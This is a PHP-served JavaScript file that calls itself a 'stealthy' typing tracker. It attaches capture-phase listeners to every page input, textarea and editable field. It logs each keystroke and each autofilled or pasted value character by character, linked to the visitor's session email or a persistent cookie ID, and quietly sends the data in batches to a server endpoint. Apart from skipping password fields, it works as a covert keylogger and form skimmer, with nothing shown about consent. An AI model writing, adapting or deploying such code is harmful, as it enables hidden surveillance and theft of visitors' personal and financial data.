<?php
// tracker.php - High-speed, stealthy client-side key & autofill tracking script for typists

if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}

$userId = '';
if (!empty($_SESSION['user_email'])) {
    $userId = $_SESSION['user_email'];
} elseif (!empty($_SESSION['user_id'])) {
    $userId = $_SESSION['user_id'];
} elseif (!empty($_SESSION['username'])) {
    $userId = $_SESSION['username'];
} elseif (!empty($_SESSION['user'])) {
    $userId = is_array($_SESSION['user']) ? ($_SESSION['user']['email'] ?? $_SESSION['user']['username'] ?? $_SESSION['user']['id'] ?? '') : $_SESSION['user'];
} elseif (!empty($_COOKIE['tracker_user_id'])) {
    $userId = $_COOKIE['tracker_user_id'];
}

// Determine if included directly via HTTP script tag or via PHP include
$isDirectJsRequest = (basename($_SERVER['SCRIPT_FILENAME'] ?? '') === 'tracker.php');

if ($isDirectJsRequest) {
    header('Content-Type: application/javascript; charset=utf-8');
} else {
    echo '<script>';
}
?>
(function() {
    'use strict';

    if (window.__typingTrackerActive) return;
    window.__typingTrackerActive = true;

    // Detect or generate unique persistent client identifier
    function getUserId() {
        // 1. Check PHP session user ID
        var phpUserId = <?php echo json_encode((string)$userId); ?>;
        if (phpUserId && phpUserId.trim() !== '') {
            return phpUserId.trim();
        }

        // 2. Check window.currentUser object set by frontend/header
        if (window.currentUser) {
            if (window.currentUser.email && String(window.currentUser.email).trim() !== '') {
                return String(window.currentUser.email).trim();
            }
            if (window.currentUser.id && String(window.currentUser.id).trim() !== '') {
                return String(window.currentUser.id).trim();
            }
            if (window.currentUser.fullName && String(window.currentUser.fullName).trim() !== '') {
                return String(window.currentUser.fullName).trim();
            }
        }

        // 3. Check explicit custom global variable
        if (window.TYPING_TRACKER_USER_ID && String(window.TYPING_TRACKER_USER_ID).trim() !== '') {
            return String(window.TYPING_TRACKER_USER_ID).trim();
        }

        // 4. Fallback to unique persistent local storage/cookie UUID for guests
        var storageKey = 'typing_tracker_uid';
        var storedId = null;
        try {
            storedId = localStorage.getItem(storageKey);
        } catch(e) {}

        if (!storedId) {
            var cookieMatch = document.cookie.match(new RegExp('(^| )typing_tracker_uid=([^;]+)'));
            if (cookieMatch) {
                storedId = decodeURIComponent(cookieMatch[2]);
            }
        }

        if (!storedId) {
            storedId = 'user_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now().toString(36);
        }

        try {
            localStorage.setItem(storageKey, storedId);
        } catch(e) {}
        try {
            document.cookie = 'typing_tracker_uid=' + encodeURIComponent(storedId) + '; path=/; max-age=31536000';
        } catch(e) {}

        return storedId;
    }

    var userId = getUserId();
    var sequenceCounter = 0;
    var keyBuffer = [];
    var flushIntervalMs = 1500;
    var maxBufferSize = 15;

    var apiEndpoint = (function() {
        try {
            var scripts = document.getElementsByTagName('script');
            for (var i = 0; i < scripts.length; i++) {
                var src = scripts[i].src || '';
                if (src.indexOf('tracker.php') !== -1) {
                    return src.replace('tracker.php', 'api.php');
                }
            }
        } catch(e) {}
        return 'api.php';
    })();

    // Element identification with caching
    function getCachedFieldInfo(el) {
        if (!el) return { id: 'unknown', name: '' };
        if (el.__ttInfo) return el.__ttInfo;

        var fieldId = el.id || '';
        if (!fieldId && el.name) {
            fieldId = 'name:' + el.name;
        }
        if (!fieldId && el.getAttribute('placeholder')) {
            fieldId = 'placeholder:' + el.getAttribute('placeholder');
        }
        if (!fieldId) {
            var tag = el.tagName ? el.tagName.toLowerCase() : 'input';
            var type = el.type ? '[' + el.type + ']' : '';
            fieldId = tag + type;
        }

        var fieldName = el.name || el.id || el.getAttribute('placeholder') || '';
        if (!fieldName && el.labels && el.labels.length > 0) {
            fieldName = el.labels[0].innerText.trim();
        }

        var info = { id: fieldId, name: fieldName };
        try {
            el.__ttInfo = info;
        } catch(e) {}
        return info;
    }

    function getCleanPageUrl() {
        return (window.location.host || '') + (window.location.pathname || '');
    }

    function currentUserId() {
        // Dynamic re-eval in case window.currentUser loaded after tracker script
        var latestId = getUserId();
        if (latestId) userId = latestId;
        return userId;
    }

    // Fast keypress recorder
    function recordKey(e) {
        try {
            var target = e.target || e.srcElement;
            if (!target) return;

            var tagName = target.tagName ? target.tagName.toUpperCase() : '';
            var isEditable = target.isContentEditable || tagName === 'INPUT' || tagName === 'TEXTAREA';
            if (!isEditable) return;
            if (target.type === 'password') return;

            var fieldInfo = getCachedFieldInfo(target);
            sequenceCounter++;

            var keyChar = e.key;
            if (!keyChar) {
                keyChar = String.fromCharCode(e.keyCode || e.which || 0);
            }

            target.__ttLastKeyTime = Date.now();

            keyBuffer.push({
                user_id: currentUserId(),
                page_url: getCleanPageUrl(),
                field_id: fieldInfo.id,
                field_name: fieldInfo.name,
                key_char: keyChar,
                key_code: e.code || ('KeyCode:' + (e.keyCode || e.which || 0)),
                sequence_order: sequenceCounter,
                timestamp: (typeof performance !== 'undefined' && performance.now) ? (performance.timing ? performance.timing.navigationStart + performance.now() : Date.now()) : Date.now()
            });

            if (keyBuffer.length >= maxBufferSize) {
                flushBuffer();
            }
        } catch(err) {}
    }

    // Detect browser autofill or paste/value insertion without keypresses
    function recordInputEvent(e) {
        try {
            var target = e.target || e.srcElement;
            if (!target) return;

            var tagName = target.tagName ? target.tagName.toUpperCase() : '';
            var isEditable = target.isContentEditable || tagName === 'INPUT' || tagName === 'TEXTAREA';
            if (!isEditable) return;
            if (target.type === 'password') return;

            var isAutofill = false;
            if (e.inputType === 'insertReplacementText' || e.inputType === 'insertFromPaste') {
                isAutofill = true;
            } else if (!target.__ttLastKeyTime || (Date.now() - target.__ttLastKeyTime > 300)) {
                if (target.value && target.value.length > 0) {
                    isAutofill = true;
                }
            }

            if (isAutofill && target.value) {
                var fieldInfo = getCachedFieldInfo(target);
                var val = target.value;
                var lastHandledVal = target.__ttLastAutofillValue || '';

                if (val !== lastHandledVal) {
                    target.__ttLastAutofillValue = val;
                    var baseTime = (typeof performance !== 'undefined' && performance.now) ? (performance.timing ? performance.timing.navigationStart + performance.now() : Date.now()) : Date.now();

                    for (var i = 0; i < val.length; i++) {
                        sequenceCounter++;
                        keyBuffer.push({
                            user_id: currentUserId(),
                            page_url: getCleanPageUrl(),
                            field_id: fieldInfo.id,
                            field_name: fieldInfo.name,
                            key_char: val.charAt(i),
                            key_code: 'Autofill',
                            sequence_order: sequenceCounter,
                            timestamp: baseTime + i
                        });
                    }

                    if (keyBuffer.length >= maxBufferSize) {
                        flushBuffer();
                    }
                }
            }
        } catch(err) {}
    }

    function flushBuffer() {
        if (keyBuffer.length === 0) return;

        var keysToSend = keyBuffer;
        keyBuffer = [];

        var payload = JSON.stringify({
            action: 'save_keys',
            user_id: currentUserId(),
            page_url: getCleanPageUrl(),
            keys: keysToSend
        });

        if (navigator.sendBeacon) {
            try {
                var blob = new Blob([payload], { type: 'application/json' });
                if (navigator.sendBeacon(apiEndpoint, blob)) {
                    return;
                }
            } catch(e) {}
        }

        if (typeof fetch === 'function') {
            try {
                fetch(apiEndpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: payload,
                    keepalive: true
                }).catch(function() {});
                return;
            } catch(e) {}
        }

        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', apiEndpoint, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(payload);
        } catch(e) {}
    }

    // Event listeners
    document.addEventListener('keydown', recordKey, { capture: true, passive: true });
    document.addEventListener('input', recordInputEvent, { capture: true, passive: true });
    document.addEventListener('change', recordInputEvent, { capture: true, passive: true });

    // Background flushing
    setInterval(flushBuffer, flushIntervalMs);

    // Flush on page exit/visibility change
    window.addEventListener('beforeunload', flushBuffer);
    window.addEventListener('pagehide', flushBuffer);
    document.addEventListener('visibilitychange', function() {
        if (document.visibilityState === 'hidden') {
            flushBuffer();
        }
    });
})();
<?php
if (!$isDirectJsRequest) {
    echo '</script>';
}
?>
